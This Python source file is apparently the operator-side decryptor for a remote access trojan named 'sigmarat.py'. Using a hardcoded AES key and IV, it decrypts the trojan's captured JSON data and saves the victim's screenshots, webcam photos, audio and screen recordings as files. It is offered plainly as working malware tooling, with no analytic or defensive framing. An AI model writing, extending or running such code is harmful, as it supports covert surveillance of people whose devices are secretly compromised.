import json
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Must match sigmarat.py
AES_KEY = b"16bytekey1234567"
AES_IV = b"16byteiv12345678"

def decrypt_data(encrypted_data):
    """Decrypt AES-encrypted data from sigmarat.py."""
    if not encrypted_data or not isinstance(encrypted_data, str):  # Skip empty or non-string data
        return encrypted_data
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decrypted = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), 16).decode()
        return decrypted
    except Exception as e:
        print(f"Decryption error: {str(e)}")
        return f"[Failed to decrypt: {encrypted_data}]"  # Return original with note if decryption fails

def save_base64_field(data, field, ext):
    """Save base64-encoded field to a file, handling dictionary structure."""
    if field in data and isinstance(data[field], dict) and data[field].get("format"):
        base64_data = data[field].get(field)  # Extract base64 string (e.g., 'screenshot', 'webcam')
        if base64_data:
            try:
                decrypted_data = decrypt_data(base64_data)
                with open(f"{field}.{ext}", "wb") as f:
                    f.write(base64.b64decode(decrypted_data))
                print(f"Saved {field} to {field}.{ext}")
            except Exception as e:
                print(f"Error saving {field}: {str(e)}")

def decrypt_json_file(input_file, output_json):
    """Decrypt all encrypted fields in the JSON file and save media files."""
    try:
        with open(input_file, "r") as f:
            encrypted_data = json.load(f)
    except Exception as e:
        print(f"Error loading input file: {str(e)}")
        return

    decrypted_data = {}

    def decrypt_value(value):
        """Recursively decrypt strings in nested structures."""
        if isinstance(value, str):
            return decrypt_data(value)
        elif isinstance(value, list):
            return [decrypt_value(item) for item in value]
        elif isinstance(value, dict):
            return {k: decrypt_value(v) for k, v in value.items()}
        return value

    # Decrypt all fields
    for key, value in encrypted_data.items():
        decrypted_data[key] = decrypt_value(value)

    # Save decrypted data to JSON
    try:
        with open(output_json, "w") as f:
            json.dump(decrypted_data, f, indent=4)
        print(f"Decrypted data saved to {output_json}")
    except Exception as e:
        print(f"Error saving output file: {str(e)}")

    # Save base64-encoded media files
    save_base64_field(decrypted_data, "screenshot", "png")
    save_base64_field(decrypted_data, "webcam", "jpg")
    save_base64_field(decrypted_data, "audio", "raw")
    save_base64_field(decrypted_data, "screen_recording", "avi")

if __name__ == "__main__":
    # Replace with your actual JSON file name
    input_json = "sigmarat_6589.json"  # Update this to match your file!
    output_json = "decrypted_output.json"
    decrypt_json_file(input_json, output_json)